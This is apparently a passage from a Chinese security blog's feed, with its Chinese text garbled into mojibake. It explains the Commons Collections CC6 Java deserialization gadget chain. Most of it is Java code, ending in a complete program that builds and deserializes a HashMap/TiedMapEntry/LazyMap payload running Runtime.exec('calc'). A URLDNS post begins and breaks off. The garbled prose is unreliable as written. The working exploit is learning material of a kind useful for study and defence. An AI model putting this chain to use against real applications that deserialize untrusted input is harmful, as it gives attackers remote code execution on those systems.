class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">    HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(map, chainedTransformer);</span><br><span class="line">    <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">    tiedMapEntry.hashCode();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åé¢å°±å’ŒURLDNSçš„æ„é€ ä¸€æ¨¡ä¸€æ ·äº†ã€‚</p><h3 id="HashMapé“¾æ¥åˆ°readObject"><a href="#HashMapé“¾æ¥åˆ°readObject" class="headerlink" title="HashMapé“¾æ¥åˆ°readObject"></a>HashMapé“¾æ¥åˆ°readObject</h3><p>HashMap#hash()è§¦å‘hashCode()</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717203502638.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717203502638.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>HashMapçš„readObjectè§¦å‘hash</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240720102312366.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240720102312366.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æŒ‰ç†è¯´æˆ‘ä»¬çš„ä»£ç å°±æ„é€ å¦‚ä¸‹äº†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">    HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(map, chainedTransformer);</span><br><span class="line">    <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">    HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    hashMap.put(tiedMapEntry, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">    serialize(hashMap);</span><br><span class="line">    unserialize(<span class="string">&quot;cc6.ser&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯putçš„æ—¶å€™ä¹Ÿè§¦å‘äº†hashï¼Œå¯¼è‡´åœ¨putçš„æ—¶å€™ä¼šå¼¹ä¸€æ¬¡è®¡ç®—å™¨</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240720102700763.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240720102700763.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æˆ‘ä»¬çœ‹çœ‹ï¼Œæœ‰æ²¡æœ‰èƒ½åå°„æ§åˆ¶å…ˆä¸è§¦å‘transformçš„åœ°æ–¹</p><p>å¯ä»¥æ”¹TiedMapEntryçš„mapä¸ºå…¶ä»–ï¼Œå¯ä»¥æ”¹chainedTransformerçš„iTransformersä¸ºå…¶ä»–ï¼Œä¹Ÿå¯ä»¥æ”¹LazyMapçš„factoryä¸ºå…¶ä»–ï¼Œå”¯ç‹¬HashMapæ”¹ä¸äº†ã€‚</p><p>æˆ‘ä»¬å°±çœ‹æ”¹LazyMapå§</p><p>ç”±äºè§¦å‘transformçš„åœ°æ–¹åœ¨LazyMap.getå¤„ï¼Œè€Œkeyå¯ä»¥æ˜¯ä»»æ„å€¼ï¼Œå› ä¸ºå·²ç»ç”¨ConstantTransformerå›ºå®šäº†ã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240720103345413.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240720103345413.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æ‰€ä»¥æ§åˆ¶keyæ²¡ç”¨ã€‚é‚£å°±æ§åˆ¶factory</p><p>åˆ›å»ºLazyMapæ—¶ï¼Œfactoryå…ˆéšä¾¿ä¼ ï¼Œç„¶ååå°„ä¿®æ”¹ä¸ºchainedTransformer</p><p>æˆ‘ä»¬çœ‹factoryçš„å®šä¹‰ï¼Œæˆ‘ä»¬çŸ¥é“æ€ä¹ˆä¿®æ”¹è®¿é—®æƒé™ï¼Œé‚£finalå®šä¹‰çš„å¸¸é‡æ€ä¹ˆä¿®æ”¹å‘¢ï¼Ÿ</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240720103943804.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240720103943804.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="ä¿®æ”¹finalå­—æ®µçš„å‡ ç§æƒ…å†µ"><a href="#ä¿®æ”¹finalå­—æ®µçš„å‡ ç§æƒ…å†µ" class="headerlink" title="ä¿®æ”¹finalå­—æ®µçš„å‡ ç§æƒ…å†µ"></a>ä¿®æ”¹finalå­—æ®µçš„å‡ ç§æƒ…å†µ</h3><ul><li>static finalï¼ˆå†…è”ä¼˜åŒ–ï¼‰</li></ul><p>å·²ç»å†…è”çš„å¸¸é‡ä¸ä¼šæ›´æ”¹ï¼Œæ„æ€å°±æ˜¯ä½ æ”¹äº†ä¸ä¼šæŠ¥é”™ï¼Œä½†ä½ ä¹Ÿæ”¹ä¸äº†</p><ul><li>finalåˆå§‹åŒ–æ—¶å°±èµ‹å€¼</li></ul><p>æ¯”å¦‚<code>private final String finalField = &quot;Initial value&quot;;</code></p><p>è¿™ç§éœ€è¦å»æ‰finalä¿®é¥°ç¬¦å†ä¿®æ”¹ã€‚åŠ ä¸Šä¿®æ”¹è®¿é—®æƒé™ï¼Œå›ºå®šçš„ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">finalField</span> <span class="operator">=</span> Example.class.getDeclaredField(<span class="string">&quot;finalField&quot;</span>);</span><br><span class="line">      <span class="comment">// å–æ¶ˆå­—æ®µçš„è®¿é—®æƒé™æ£€æŸ¥</span></span><br><span class="line">      finalField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">modifiersField</span> <span class="operator">=</span> Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">      modifiersField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">      modifiersField.setInt(finalField, finalField.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">finalField.set(....)</span><br></pre></td></tr></table></figure><ul><li>finalåˆå§‹åŒ–ä»…å£°æ˜ï¼Œä¸èµ‹å€¼</li></ul><p>å¦‚<code>private final String finalField;</code>ï¼Œåœ¨æŸäº›å‡½æ•°é‡Œèµ‹å€¼ã€‚</p><p>è¿™ç§ä¸ç”¨å»æ‰finalä¿®é¥°ç¬¦ä¹Ÿèƒ½ä¿®æ”¹ã€‚ä»…éœ€ä¿®æ”¹è®¿é—®æƒé™ã€‚å½“ç„¶ä¹Ÿèƒ½å»æ‰åä¿®æ”¹</p><p>æ‰€ä»¥è¿™é‡Œåœ¨putåä¿®æ”¹factoryå¯ä»¥ç”¨ä¸¤ç§ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ç›´æ¥ä¿®æ”¹</span></span><br><span class="line">hashMap.put(tiedMapEntry, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">lazymapClass</span> <span class="operator">=</span> lazyMap.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factory</span> <span class="operator">=</span> lazymapClass.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factory.set(lazyMap, chainedTransformer);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//å»æ‰finalå†ä¿®æ”¹</span></span><br><span class="line">hashMap.put(tiedMapEntry, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">lazymapClass</span> <span class="operator">=</span> lazyMap.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factory</span> <span class="operator">=</span> lazymapClass.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">modifiersField</span> <span class="operator">=</span> Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">        modifiersField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        modifiersField.setInt(factory, factory.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">        factory.set(lazyMap, chainedTransformer);</span><br></pre></td></tr></table></figure><p>ç›®å‰å®Œæ•´çš„ä»£ç æ˜¯ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">    HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(map, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="string">&quot;godown&quot;</span>));</span><br><span class="line">    <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;test1&quot;</span>);</span><br><span class="line">    HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    hashMap.put(tiedMapEntry, <span class="string">&quot;test2&quot;</span>);</span><br><span class="line">    <span class="type">Class</span> <span class="variable">lazymapClass</span> <span class="operator">=</span> lazyMap.getClass();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">factory</span> <span class="operator">=</span> lazymapClass.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">    factory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">modifiersField</span> <span class="operator">=</span> Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">    modifiersField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    modifiersField.setInt(factory, factory.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">    factory.set(lazyMap, chainedTransformer);</span><br><span class="line">    serialize(hashMap);</span><br><span class="line">    unserialize(<span class="string">&quot;cc6.ser&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="LazyMap-getä¸­è¿›è¡Œçš„å†—ä½™çš„map-put"><a href="#LazyMap-getä¸­è¿›è¡Œçš„å†—ä½™çš„map-put" class="headerlink" title="LazyMap#getä¸­è¿›è¡Œçš„å†—ä½™çš„map.put"></a>LazyMap#getä¸­è¿›è¡Œçš„å†—ä½™çš„map.put</h3><p>ä½†æ˜¯ä¸ºä»€ä¹ˆè¿è¡Œä¸äº†å‘¢ï¼Ÿæˆ‘ä»¬åœ¨LazyMap.getæ‰“ä¸ªæ–­ç‚¹è°ƒè¯•ä¸€ä¸‹</p><p>æˆ‘ä»¬å‘ç°åœ¨putçš„æ—¶å€™ï¼Œä¼šè°ƒç”¨åˆ°LazyMapçš„getæ–¹æ³•ï¼Œåœ¨è¿™ä¸ªæ–¹æ³•ä¸­å‘HashMapæ·»åŠ è¿›äº†TiedMapEntryä¼ çš„keyï¼Œå’Œfactory.transformçš„ç»“æœã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240720112035548.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240720112035548.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240720112514435.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240720112514435.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åœ¨æˆ‘ä»¬ååºåˆ—åŒ–çš„æ—¶å€™ï¼Œå†æ¬¡èµ°åˆ°è¿™ä¸ªLazyMap.getï¼Œmapé‡Œå·²ç»æœ‰äº†è¿™å¯¹é”®å€¼å¯¹äº†ï¼Œå°±ä¸ä¼šèµ°å…¥ifé‡Œè§¦å‘transform</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240720113211140.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240720113211140.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>é‚£æˆ‘ä»¬åœ¨putåç§»é™¤è¿™ä¸ª(key,value)ï¼Œä¹Ÿå°±æ˜¯æœ¬ä»£ç çš„(â€œtest1â€,â€godownâ€)ä¸å°±èƒ½è¿›å»äº†å—ã€‚</p><p>æ³¨æ„æˆ‘ä»¬è§¦å‘ä»£ç éœ€è¦çš„æ˜¯<code>hashMap.put(tiedMapEntry, &quot;test2&quot;);</code>è¿™ä¸ªé”®å€¼å¯¹ï¼Œè€Œä¸æ˜¯ä¸Šé¢<code>HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();</code>å†…çš„é”®å€¼å¯¹</p><p>å®Œæ•´ä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6TiedMapEntry</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(map, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="string">&quot;godown&quot;</span>));</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;test1&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry, <span class="string">&quot;test2&quot;</span>);</span><br><span class="line">        map.remove(<span class="string">&quot;test1&quot;</span>);<span class="comment">//ç§»é™¤</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">lazymapClass</span> <span class="operator">=</span> lazyMap.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factory</span> <span class="operator">=</span> lazymapClass.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">modifiersField</span> <span class="operator">=</span> Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">        modifiersField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        modifiersField.setInt(factory, factory.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">        factory.set(lazyMap, chainedTransformer);</span><br><span class="line">        serialize(hashMap);</span><br><span class="line">        unserialize(<span class="string">&quot;cc6.ser&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc6.ser&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
          <category> CC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CCé‡å¯ä¹‹URLDNSè¡¥è¯¾</title>
      <link href="/2024/07/19/urldns-bu-ke/"/>
      <url>/2024/07/19/urldns-bu-ke/</url>
      
        <content type="html"><![CDATA[<p>åœ¨å†™CC6çš„æ—¶å€™ï¼Œå‘ç°ååŠæˆªæ˜¯URLDNSçš„é“¾ï¼Œæ¥é‡æ–°æ„é€ ä¸€éURLDNSã€‚</p><p>ä»–å¦ˆçš„ï¼ŒæŠ¤ç½‘è¿˜è¢«é¸½äº†ï¼Œé¢è¯•æ˜¯æ²¡æŒ‚è¿‡çš„ï¼Œé¡¹ç›®æ˜¯æ²¡å»è¿‡çš„ã€‚</p><h2 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h2><h3 id="DNSè§£æ"><a href="#DNSè§£æ" class="headerlink" title="DNSè§£æ"></a>DNSè§£æ</h3><p>æ¼æ´è§¦å‘ç‚¹åœ¨InetAddress#getByName()èƒ½è§¦å‘DNSè§£æ</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717211430126.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717211430126.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åŒæ ·æ¥è‡ªäºInetAddressçš„getHostAddressè°ƒç”¨äº†getByNameæ–¹æ³•ã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717211518306.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717211518306.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æŠ½è±¡ç±»java.net.URLStreamHandlerçš„hashCodeè°ƒç”¨äº†getHostAddressã€‚æ³¨æ„è¿™é‡Œæ˜¯éœ€è¦URLå‚æ•°çš„hashCode()ï¼Œè€Œä¸æ˜¯è´¼å¤šæ–¹æ³•éƒ½è°ƒç”¨çš„é‚£ä¸ªæ— å‚hashCode()ã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717211715438.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717211715438.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è¿™ä¸ªæœ‰å‚hashCodeåªåœ¨URLç±»ä¸­ä½¿ç”¨</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717212309900.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717212309900.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>URL.hashCode()å¦‚ä¸‹</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717213805181.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717213805181.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>é‚£æˆ‘ä»¬å¦‚ä½•ä¼ å‚å‘hashCodeå‘¢ï¼Ÿhandlerå·²ç»å®šä¹‰ä¸ºURLStreamHandleräº†ï¼Œthisæ˜¯æŠŠå½“å‰å¯¹è±¡ä¼ è¿›å»ã€‚</p><blockquote><p>åœ¨URLç±»ä¸­å…ˆå£°æ˜äº†æŠ½è±¡ç±»URLStreamHandlerçš„å˜é‡ï¼Œåé¢ä¼šæ ¹æ®åè®®é€‰æ‹©ç”¨å“ªä¸ªå­ç±»æ¥å¤„ç†è¿™ä¸ªURL</p><blockquote><p>Javaä¸­å¯ä»¥å…ˆå®šä¹‰ä¸€ä¸ªæŠ½è±¡ç±»çš„å˜é‡ï¼Œå¦‚URLStreamHandler handlerï¼Œä½†ä¸èƒ½ç”¨è¿™ä¸ªå˜é‡æ¥å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡</p></blockquote><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717220034094.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717220034094.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p></blockquote><p>URLæœ‰å…¬å¼€çš„æ„é€ å‡½æ•°ï¼Œæˆ‘ä»¬ç”¨æœ€ç®€å•é‚£ä¸ª</p><p><img 